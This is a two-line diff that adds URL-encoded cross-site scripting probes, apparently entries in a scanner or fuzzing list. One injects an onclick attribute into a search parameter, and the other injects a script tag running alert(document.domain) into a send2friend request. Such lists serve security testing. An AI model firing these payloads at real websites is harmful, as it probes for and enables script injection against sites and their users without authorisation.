@@ -1,0 +1,2 @@
+/index.php?search=1af%22+onclick%3D
+/?action=send2friend&artlang=aaaa%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
